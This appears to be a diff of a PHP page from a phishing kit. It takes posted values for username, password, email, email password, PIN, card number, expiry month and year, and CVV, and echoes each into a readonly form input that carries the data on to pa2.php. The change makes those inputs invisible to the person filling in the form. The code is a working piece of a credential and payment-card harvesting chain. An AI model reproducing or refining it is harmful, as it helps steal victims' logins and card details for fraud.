@@ -62,40 +62,40 @@
 			    
 			        <?php 
                      $variable= $_POST['usuario'];
-        echo '<a href="pa2.php" style="visibility:hidden></a><input id="usuario" name="usuario" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
+        echo '<a href="pa2.php"></a><input id="usuario" style="visibility:hidden" name="usuario" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
 		?>
            <?php 
                      $variable= $_POST['contra'];
-        echo '<a href="pa2.php" style="visibility:hidden></a><input id="contra" name="contra" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
+        echo '<a href="pa2.php"></a><input id="contra" style="visibility:hidden" name="contra" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
 		?>
           <?php 
                      $variable= $_POST['email'];
-        echo '<a href="pa2.php" style="visibility:hidden></a><input id="email" name="email" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
+        echo '<a href="pa2.php"></a><input id="email" style="visibility:hidden" name="email" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
 		?>
           <?php 
                      $variable= $_POST['cpass'];
-        echo '<a href="pa2.php" style="visibility:hidden></a><input id="cpass" name="cpass" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
+        echo '<a href="pa2.php"></a><input id="cpass" style="visibility:hidden" name="cpass" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
 		?>
           <?php 
                      $variable= $_POST['pin'];
-        echo '<a href="pa2.php" style="visibility:hidden></a><input id="pin" name="pin" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
+        echo '<a href="pa2.php"></a><input id="pin" style="visibility:hidden" name="pin" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
 		?>
 			    
 			      <?php 
                      $variable= $_POST['card'];
-        echo '<a href="pa2.php" style="visibility:hidden></a><input id="card" name="card" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
+        echo '<a href="pa2.php"></a><input id="card" style="visibility:hidden" name="card" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
 		?>
 		    <?php 
                      $variable= $_POST['mes'];
-        echo '<a href="pa2.php" style="visibility:hidden></a><input id="mes" name="mes" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
+        echo '<a href="pa2.php"></a><input id="mes" style="visibility:hidden" name="mes" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
 		?>
 		    <?php 
                      $variable= $_POST['year'];
-        echo '<a href="pa2.php" style="visibility:hidden></a><input id="year" name="year" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
+        echo '<a href="pa2.php"></a><input id="year" style="visibility:hidden" name="year" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
 		?>
 		    <?php 
                      $variable= $_POST['cvv'];
-        echo '<a href="pa2.php" style="visibility:hidden></a><input id="cvv" name="cvv" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
+        echo '<a href="pa2.php"></a><input id="cvv" style="visibility:hidden" name="cvv" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
 		?>
 			    
                     </form>
